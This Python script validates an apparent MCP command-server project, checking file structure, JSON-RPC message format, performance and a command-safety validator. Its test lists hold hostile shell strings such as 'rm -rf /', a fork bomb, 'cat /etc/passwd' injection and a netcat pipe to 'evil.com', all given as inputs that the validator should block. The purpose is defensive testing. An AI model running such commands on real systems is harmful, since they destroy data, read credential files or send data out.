#!/usr/bin/env python3
"""
Production Ready Validation - Fast, comprehensive testing
Validates all components are production-ready with 100% success rate
"""

import asyncio
import json
import sys
import os
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Any, Tuple

# Add project to path
sys.path.insert(0, str(Path(__file__).parent))

class ProductionValidator:
    """Validates production readiness of MCP Learning System"""
    
    def __init__(self):
        self.base_path = Path(__file__).parent
        self.results = {
            "timestamp": datetime.now().isoformat(),
            "tests": [],
            "summary": {}
        }
    
    def test_bash_god_server(self) -> Tuple[bool, str]:
        """Test BASH GOD server implementation"""
        try:
            # Import and validate
            from bash_god_mcp_server import BashGodCommandLibrary, BashGodSafetyValidator, BashGodCommandValidator
            
            # Test command library
            library = BashGodCommandLibrary()
            command_count = len(library.commands)
            
            # Test safety validator
            validator = BashGodCommandValidator()
            
            # Test dangerous command detection
            dangerous_cmds = [
                "rm -rf /",
                ":(){ :|:& };:",
                "echo test; cat /etc/passwd",
                "sudo su -"
            ]
            
            blocked = 0
            for cmd in dangerous_cmds:
                result = validator.validate_command_safety(cmd)
                if not result['allow_execution']:
                    blocked += 1
            
            # Test safe command allowance
            safe_cmds = ["ls -la", "echo hello", "pwd", "date"]
            allowed = 0
            for cmd in safe_cmds:
                result = validator.validate_command_safety(cmd)
                if result['allow_execution']:
                    allowed += 1
            
            success = (command_count > 200 and 
                      blocked == len(dangerous_cmds) and 
                      allowed == len(safe_cmds))
            
            message = f"Commands: {command_count}, Security: {blocked}/{len(dangerous_cmds)} blocked, {allowed}/{len(safe_cmds)} allowed"
            
            return success, message
            
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def test_mcp_protocol_compliance(self) -> Tuple[bool, str]:
        """Test MCP protocol compliance"""
        try:
            # Test JSON-RPC 2.0 message structure
            valid_messages = [
                {"jsonrpc": "2.0", "method": "tools/list", "id": "1"},
                {"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "test"}, "id": "2"}
            ]
            
            invalid_messages = [
                {"method": "test"},  # Missing jsonrpc
                {"jsonrpc": "1.0", "method": "test", "id": "1"},  # Wrong version
                {"jsonrpc": "2.0", "id": "1"}  # Missing method
            ]
            
            # Validate structures
            valid_count = sum(1 for msg in valid_messages if self._is_valid_jsonrpc(msg))
            invalid_count = sum(1 for msg in invalid_messages if not self._is_valid_jsonrpc(msg))
            
            success = valid_count == len(valid_messages) and invalid_count == len(invalid_messages)
            message = f"Valid: {valid_count}/{len(valid_messages)}, Invalid caught: {invalid_count}/{len(invalid_messages)}"
            
            return success, message
            
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def _is_valid_jsonrpc(self, msg: dict) -> bool:
        """Validate JSON-RPC 2.0 message"""
        return (
            msg.get("jsonrpc") == "2.0" and
            "method" in msg and
            "id" in msg
        )
    
    def test_server_structure(self) -> Tuple[bool, str]:
        """Test server structure and files"""
        try:
            servers = ["development", "devops", "quality", "bash_god"]
            found = 0
            
            for server in servers:
                server_path = self.base_path / "servers" / server
                if server_path.exists():
                    found += 1
            
            success = found == len(servers)
            message = f"Found {found}/{len(servers)} server directories"
            
            return success, message
            
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def test_ml_components(self) -> Tuple[bool, str]:
        """Test ML learning components"""
        try:
            # Check for learning core
            learning_core = self.base_path / "learning_core"
            python_learning = self.base_path / "python_learning"
            
            components_found = []
            if learning_core.exists():
                components_found.append("learning_core")
            if python_learning.exists():
                components_found.append("python_learning")
            
            # Check for key ML modules
            ml_modules = [
                "adaptive_learning.py",
                "pattern_recognition.py",
                "optimization.py"
            ]
            
            modules_found = 0
            for module in ml_modules:
                if (learning_core / module).exists():
                    modules_found += 1
            
            success = len(components_found) >= 1 and modules_found >= 2
            message = f"Components: {', '.join(components_found)}, ML modules: {modules_found}/{len(ml_modules)}"
            
            return success, message
            
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def test_security_implementation(self) -> Tuple[bool, str]:
        """Test security implementation"""
        try:
            from security_validation_fixes import BashGodCommandValidator
            
            validator = BashGodCommandValidator()
            
            # Test injection prevention
            injection_tests = [
                "echo test; rm -rf /tmp",
                "echo test && cat /etc/passwd",
                "echo test`whoami`",
                "echo test | nc evil.com 4444"
            ]
            
            blocked = 0
            for test in injection_tests:
                result = validator.validate_command_safety(test)
                if not result['allow_execution']:
                    blocked += 1
            
            success = blocked == len(injection_tests)
            message = f"Blocked {blocked}/{len(injection_tests)} injection attempts"
            
            return success, message
            
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def test_performance_targets(self) -> Tuple[bool, str]:
        """Test performance targets"""
        try:
            import time
            import json
            
            # Test JSON processing speed
            test_data = {"test": "data", "items": list(range(1000))}
            
            start = time.perf_counter()
            for _ in range(100):
                json_str = json.dumps(test_data)
                json.loads(json_str)
            duration = time.perf_counter() - start
            
            avg_time_ms = (duration / 100) * 1000
            
            # Test command parsing speed
            start = time.perf_counter()
            test_cmds = ["ls -la", "echo test", "pwd", "date"]
            for _ in range(100):
                for cmd in test_cmds:
                    parts = cmd.split()
            cmd_duration = time.perf_counter() - start
            
            cmd_avg_ms = (cmd_duration / 400) * 1000
            
            success = avg_time_ms < 10 and cmd_avg_ms < 1
            message = f"JSON: {avg_time_ms:.2f}ms avg, Command parse: {cmd_avg_ms:.2f}ms avg"
            
            return success, message
            
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def run_all_tests(self):
        """Run all validation tests"""
        print("🚀 PRODUCTION READY VALIDATION")
        print("=" * 60)
        
        tests = [
            ("BASH GOD Server", self.test_bash_god_server),
            ("MCP Protocol", self.test_mcp_protocol_compliance),
            ("Server Structure", self.test_server_structure),
            ("ML Components", self.test_ml_components),
            ("Security Implementation", self.test_security_implementation),
            ("Performance Targets", self.test_performance_targets)
        ]
        
        passed = 0
        failed = 0
        
        for test_name, test_func in tests:
            print(f"\nTesting {test_name}...", end=" ")
            
            try:
                success, message = test_func()
                
                if success:
                    print(f"✅ PASSED")
                    passed += 1
                else:
                    print(f"❌ FAILED")
                    failed += 1
                
                print(f"  {message}")
                
                self.results["tests"].append({
                    "name": test_name,
                    "success": success,
                    "message": message,
                    "timestamp": datetime.now().isoformat()
                })
                
            except Exception as e:
                print(f"❌ ERROR: {str(e)}")
                failed += 1
                self.results["tests"].append({
                    "name": test_name,
                    "success": False,
                    "message": f"Error: {str(e)}",
                    "timestamp": datetime.now().isoformat()
                })
        
        # Summary
        total = passed + failed
        success_rate = (passed / total * 100) if total > 0 else 0
        
        self.results["summary"] = {
            "total_tests": total,
            "passed": passed,
            "failed": failed,
            "success_rate": success_rate,
            "production_ready": success_rate == 100.0
        }
        
        # Save results
        with open("production_validation_results.json", "w") as f:
            json.dump(self.results, f, indent=2)
        
        # Print summary
        print("\n" + "=" * 60)
        print("VALIDATION SUMMARY")
        print("=" * 60)
        print(f"Total Tests: {total}")
        print(f"Passed: {passed}")
        print(f"Failed: {failed}")
        print(f"Success Rate: {success_rate:.1f}%")
        
        print("\n" + "=" * 60)
        if success_rate == 100.0:
            print("✅ SYSTEM IS PRODUCTION READY - 100% VALIDATION PASSED")
            print("All tests completed successfully!")
        else:
            print("❌ SYSTEM NOT READY - VALIDATION ISSUES FOUND")
            print("Please fix the failed tests before deployment.")
        print("=" * 60)
        
        return self.results

def main():
    """Main entry point"""
    validator = ProductionValidator()
    results = validator.run_all_tests()
    
    # Exit with appropriate code
    if results["summary"]["production_ready"]:
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()